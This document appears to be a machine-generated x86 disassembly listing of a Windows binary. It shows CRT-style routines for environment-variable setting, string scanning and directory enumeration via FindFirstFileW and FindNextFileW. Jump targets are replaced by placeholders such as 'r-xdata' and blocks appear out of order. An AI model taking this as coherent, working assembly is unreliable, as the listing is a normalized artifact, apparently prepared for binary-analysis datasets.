add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_1003b694
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003789d
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_1002972b
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1003b7d0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_1003b1e3
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_1003b822
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_1002a045
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_10027ad8
jmp r-xdata
push eax
call sub_1003bac7
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_1003b87c
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_1002972b
mov [ eax ] 0x16
push 0x3d
push esi
call sub_1003bbd8
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_1003b822
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_1003b7d0
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_1002a000
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_1003b1fd
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_10024aba
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_10024aba
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_1002a000
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_1002a0df
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_1002a0df
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_10024630
inc eax
pop ecx
inc eax
push eax
call sub_1002a045
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10024aba
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_10024630
inc eax
pop ecx
inc eax
push eax
push edi
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
push edi
call sub_10024aba
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_1002972b
mov [ eax ] 0x2a
sub_1003bac7
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_10024630
mov esi eax
inc esi
push esi
call sub_100272fd
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
pop ebx
pop ebp
retn
mov eax edi
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
pop edi
pop esi
sub_1003bb1c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ eax ]
movzx ecx cx
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_1003bc00
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_1003bc00
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_1003bce3
push esi
mov esi [ esp + 0xc ]
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ esp + 0x8 ]
mov [ eax ] ecx
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
pop esi
retn
push eax
call [ FindClose@IAT ]
and [ esi ] 0x0
sub_1003bd3c
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
push esi
call sub_1003bd0f
mov eax [ edi + 0x4 ]
pop ecx
pop ecx
mov ecx [ esi + 0x4 ]
mov [ edi + 0x4 ] ecx
pop edi
mov [ esi + 0x4 ] eax
pop esi
retn 0x4
sub_1003bd5e
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ecx
lea ecx [ ebp - 0x8 ]
call sub_1003bd3c
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
leave
retn
call sub_10003d5c
sub_1003bd9f
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
mov eax ecx
push [ eax ]
mov ecx [ eax + 0x4 ]
push [ ebp + 0x8 ]
mov edx [ ecx ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003bdd9
push 0x4
mov eax sub_1004b7ee
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_10003efc
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x1c ]
call sub_10003efc
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_10003d21
mov eax esi
call sub_100282db
retn
sub_1003be0f
push 0x4
mov eax sub_1004b7ee
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
xor edi edi
inc edi
push 0x0
push edi
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x4 ] edi
call sub_10002020
push 0x0
lea ecx [ esi + 0x1c ]
push edi
mov [ ebp - 0x4 ] 0x0
call sub_10001500
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push edi
mov ecx esi
call sub_10001500
call sub_100282db
retn
sub_1003be54
push 0x4
mov eax sub_1004b811
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
push [ ebp + 0x10 ]
call sub_10002075
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x28 ] eax
mov eax [ ebp + 0xc ]
lea ecx [ esi + 0x30 ]
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
call sub_10003d21
mov eax esi
call sub_100282db
retn 0xc
sub_1003be95
push 0x20
mov eax sub_1004b84d
call sub_10028203
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_1000136c
push [ ebp + 0x10 ]
xor esi esi
inc esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] esi
call sub_1003d49a
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000136c
push 0x0
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
call sub_10001500
mov eax [ ebp + 0x8 ]
call sub_100282db
retn
sub_1003befe
push 0x24
mov eax sub_1004b870
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
xor ebx ebx
cmp [ esi + 0x44 ] ebx
jne r-xdata
cmp [ esi + 0x48 ] 0x10
jb r-xdata
cmp [ esi + 0x24 ] 0x10
mov [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi + 0x34 ]
mov eax [ esi + 0x34 ]
jmp r-xdata
lea eax [ esi + 0x10 ]
mov eax [ esi + 0x10 ]
jmp r-xdata
call sub_100282db
retn
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ esi + 0x28 ]
call sub_1003bd9f
push 0xffffffff
push ebx
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_100086af
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] bl
call sub_10002020
push r--data
mov ecx edi
call sub_10017960
lea edi [ esi + 0x30 ]
push eax
mov ecx edi
call sub_10001c62
cmp [ esi + 0x44 ] ebx
je r-xdata
sub_1003bfe5
push 0x278
mov eax sub_1004b893
call sub_1002826c
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x284 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x280 ] ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_1000136c
mov eax [ ebp - 0x18 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax r--data
dec eax
push eax
lea ecx [ ebp - 0x2c ]
call sub_10005326
cmp [ eax ] 0x5c
je r-xdata
lea ecx [ ebp - 0x27c ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov [ edi ] eax
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x28 ]
mov eax r--data
jmp r-xdata
mov eax [ ebp - 0x18 ]
dec eax
push eax
lea ecx [ ebp - 0x2c ]
call sub_10005326
cmp [ eax ] 0x2f
je r-xdata
mov ecx [ ebp - 0x284 ]
lea eax [ ebp - 0x250 ]
push eax
call sub_100014e3
test [ ebp - 0x27c ] 0x400
je r-xdata
and [ edi ] 0x0
mov edi [ GetLastError@IAT ]
call edi
cmp eax 0x2
je r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_10005562
cmp [ ebp - 0x14 ] 0x8
mov eax [ ebp - 0x28 ]
jae r-xdata
mov eax [ ebp - 0x18 ]
dec eax
push eax
lea ecx [ ebp - 0x2c ]
call sub_10005326
cmp [ eax ] 0x3a
jne r-xdata
test [ ebp - 0x27c ] 0x10
mov ecx [ ebp - 0x280 ]
je r-xdata
mov eax [ ebp - 0x280 ]
and [ ebx ] 0x0
and [ eax ] 0x0
jmp r-xdata
xor edi edi
call edi
cmp eax 0x12
je r-xdata
push 0x2
push 0x3
jmp r-xdata
and [ esi ] 0x0
call sub_1003db19
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ esi + 0x4 ] eax
call sub_10001500
mov eax esi
call sub_100282ef
retn
call edi
mov edi eax
jmp r-xdata
pop eax
mov [ ebx ] eax
mov [ ecx ] eax
call sub_1003db19
mov [ esi ] edi
jmp r-xdata
sub_1003c123
push ebp
mov ebp esp
sub esp 0x260
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x25c ] ecx
lea ecx [ ebp - 0x254 ]
push ecx
push [ eax ]
mov [ ebp - 0x258 ] eax
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x25c ]
lea eax [ ebp - 0x228 ]
push eax
call sub_100014e3
xor ecx ecx
test [ ebp - 0x254 ] 0x400
je r-xdata
call [ GetLastError@IAT ]
push [ ebp - 0x258 ]
mov edi eax
lea eax [ ebp - 0x260 ]
push eax
call sub_1003bce3
pop ecx
pop ecx
call sub_1003db19
mov ecx edi
sub ecx 0x12
neg ecx
sbb ecx ecx
and ecx edi
mov [ esi ] ecx
jmp r-xdata
test [ ebp - 0x254 ] 0x10
je r-xdata
mov [ edi ] ecx
mov [ ebx ] ecx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
push 0x2
push 0x3
jmp r-xdata
mov [ esi ] ecx
call sub_1003db19
pop eax
mov [ edi ] eax
mov [ ebx ] eax
sub_1003c1ec
push 0x4
mov eax sub_1004b8bb
call sub_10028236
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_10024389
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_100282db
retn 0x4
sub_1003c24f
push 0x4
mov eax sub_1004dcb1
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_10003efc
and [ ebp - 0x4 ] 0x0
call sub_1003d584
mov eax [ ebp + 0x8 ]
push [ eax ]
mov ecx esi
call sub_10005562
mov eax esi
call sub_100282db
retn 0x8
sub_1003c284
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
lea ecx [ esi + 0x4 ]
mov [ esi ] edi
call sub_1003c1ec
push edi
push edi
push esi
call sub_10001a27
add esp 0xc
pop edi
mov eax esi
pop esi
retn 0x4
sub_1003c2a9
push ebp
mov ebp esp
push ecx
push ecx
push esi
push [ ebp + 0x8 ]
mov esi ecx
lea ecx [ ebp - 0x8 ]
call sub_1003c284
push esi
mov ecx eax
call sub_1003bd3c
mov ecx [ ebp - 0x4 ]
pop esi
test ecx ecx
je r-xdata
leave
retn 0x4
call sub_10003d5c
sub_1003c30e
push 0x18
mov eax sub_1004b8ef
call sub_10028203
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor esi esi
mov edi ecx
mov ecx ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esi
call sub_10003d21
mov [ ebp - 0x4 ] esi
mov esi [ edi + 0x14 ]
mov [ ebp - 0x10 ] 0x1
test esi esi
je r-xdata
mov eax ebx
call sub_100282db
retn 0x8
push [ ebp - 0x14 ]
lea eax [ ebp - 0x18 ]
push ebx
push eax
mov ecx edi
call sub_10008a30
mov ecx eax
call sub_10005274
lea eax [ eax + esi * 2 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
call sub_10008a30
mov ecx eax
call sub_10005274
push eax
call sub_1003d83d
add esp 0x10
sub_1003c387
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi ecx
call sub_1003d584
push [ eax ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_1003c30e
mov eax [ ebp + 0x8 ]
pop esi
leave
retn 0x4
sub_1003c3ab
push 0x40
mov eax sub_1004b91a
call sub_10028236
mov esi ecx
mov [ ebp - 0x14 ] esi
mov edi [ esi + 0x4c ]
xor ebx ebx
cmp edi ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
cmp [ edi + 0x4c ] ebx
jne r-xdata
call sub_1003befe
jmp r-xdata
mov esi [ esi + 0x4c ]
add esi 0x38
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx esi
call sub_1003befe
push eax
lea ecx [ edi + 0x38 ]
call sub_10001c62
mov eax [ esi + 0x4c ]
cmp [ eax + 0x14 ] ebx
je r-xdata
call sub_100282db
retn
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x4c ]
cmp [ eax + 0x30 ] ebx
je r-xdata
push r--data
lea ecx [ eax + 0x38 ]
call sub_10017960
mov ecx [ esi + 0x4c ]
lea eax [ ebp - 0x30 ]
push eax
call sub_1003c387
mov ecx [ esi + 0x4c ]
push 0xffffffff
push ebx
push eax
add ecx 0x38
mov [ ebp - 0x4 ] 0x1
call sub_100086af
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] bl
call sub_10002020
mov eax [ esi + 0x4c ]
push r--data
lea ecx [ eax + 0x38 ]
call sub_10017960
push r--data
lea ecx [ eax + 0x38 ]
call sub_10017960
mov eax [ esi + 0x4c ]
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ eax + 0x1c ]
call sub_1003c387
mov ecx [ esi + 0x4c ]
push 0xffffffff
push ebx
push eax
add ecx 0x38
mov [ ebp - 0x4 ] 0x2
call sub_100086af
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] bl
call sub_10002020
mov eax [ esi + 0x4c ]
push r--data
lea ecx [ eax + 0x38 ]
call sub_10017960
sub_1003c4c2
push 0x8
mov eax sub_1004b952
call sub_10028236
mov edi ecx
mov [ ebp - 0x14 ] edi
push [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1003be54
xor ebx ebx
lea esi [ edi + 0x4c ]
mov [ edi ] r--data
mov [ esi ] ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
push 0x54
mov [ ebp - 0x4 ] 0x2
call sub_10024389
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x4 ] 0x3
cmp ecx ebx
je r-xdata
xor eax eax
call sub_1003bdd9
jmp r-xdata
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1003c2a9
push [ ebp + 0xc ]
mov ecx [ esi ]
call sub_1003bf9f
jmp sub_1003c542
sub_1003c569
push 0x4
mov eax sub_1004b811
call sub_10028203
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_10001b7b
and [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
mov eax [ edi + 0x2c ]
add edi 0x30
push edi
lea ecx [ esi + 0x30 ]
mov [ esi + 0x2c ] eax
call sub_10001fc2
mov eax esi
call sub_100282db
retn 0x4
sub_1003c5af
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_1003c569
add edi 0x4c
push edi
lea ecx [ esi + 0x4c ]
mov [ esi ] r--data
call sub_1003c54c
pop edi
mov eax esi
pop esi
retn 0x4
sub_1003c5d6
push ebp
mov ebp esp
sub esp 0x54
cmp [ ebp + 0x8 ] 0x0
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jne r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
mov [ eax ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0xc ]
push [ eax + 0x4 ]
lea ecx [ ebp - 0x54 ]
push [ eax ]
push [ ebp + 0x10 ]
push [ ebp + 0x18 ]
call sub_1003c4c2
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_10027dd1
mov al [ ebp + 0x8 ]
pop esi
leave
retn
and [ esi ] 0x0
call sub_1003db19
mov [ esi + 0x4 ] eax
jmp r-xdata
sub_1003c635
push 0xc4
mov eax sub_1004b98d
call sub_1002826c
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
xor ebx ebx
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0x7
call sub_100016a9
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
call sub_1003db19
jmp r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
add eax 0x24
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_1003c123
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
add esp 0x14
neg ecx
sbb ecx ecx
mov [ ebp - 0x38 ] eax
test ecx sub_10001a27
je r-xdata
cmp edi ebx
je r-xdata
mov ecx esi
call sub_1003bd5e
cmp edi ebx
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x24 ] ebx
je r-xdata
mov [ edi ] ebx
call sub_1003db19
mov [ edi + 0x4 ] eax
call sub_1003db19
mov esi eax
call [ GetLastError@IAT ]
mov [ edi ] eax
mov [ edi + 0x4 ] esi
jmp r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001c7f
mov ecx [ esi ]
lea eax [ ebp - 0x7c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1003d688
mov esi eax
mov [ ebp - 0x4 ] 0x2
call sub_1003db19
mov edi eax
call [ GetLastError@IAT ]
push edi
push eax
push esi
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0xd0 ]
call sub_1003c4c2
push r--data
lea eax [ ebp - 0xd0 ]
push eax
call sub_10027dd1
mov ecx esi
call sub_1003bd5e
jmp r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005326
cmp [ eax ] 0x2e
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10001500
call sub_100282ef
retn
push ebx
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x60 ]
call sub_10011dc6
push [ ebp - 0x34 ]
mov esi [ esi ]
push [ ebp - 0x30 ]
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_1003bcbe
push ebx
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] bl
call sub_10001500
cmp [ ebp - 0x18 ] 0x1
je r-xdata
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005326
cmp [ eax ] 0x2e
jne r-xdata
cmp [ ebp - 0x18 ] 0x2
jne r-xdata
sub_1003c7b3
push 0x8c
mov eax sub_1004b9e8
call sub_1002826c
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push r--data
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x38 ] eax
call sub_10001c7f
xor ebx ebx
cmp [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
sete al
mov [ ebp - 0x34 ] al
lea eax [ ebp - 0x60 ]
push eax
push [ ebp - 0x38 ]
push esi
push rw-data
push [ ebp - 0x34 ]
call sub_1003c5d6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x14
push ebx
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x2d ] al
call sub_10002020
cmp [ ebp - 0x2d ] bl
jne r-xdata
call sub_100282ef
retn
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0x7
call sub_100016a9
cmp [ esi + 0x18 ] 0x8
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x44 ] ebx
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax [ edi ]
cmp [ eax + 0x24 ] ebx
jne r-xdata
mov ecx edi
call sub_1003bd5e
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001c7f
lea eax [ ebp - 0x60 ]
push eax
push [ ebp - 0x38 ]
lea eax [ ebp - 0x40 ]
push esi
push eax
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_1003c5d6
add esp 0x14
push ebx
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_10002020
jmp r-xdata
mov [ ebp - 0x3c ] eax
push ebx
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x60 ]
call sub_1003c24f
mov eax [ edi ]
lea ecx [ ebp - 0x44 ]
push ecx
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x60 ]
push ecx
add eax 0x24
push eax
lea eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1003bfe5
add esp 0x18
push ebx
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001500
mov eax [ ebp - 0x40 ]
neg eax
sbb eax eax
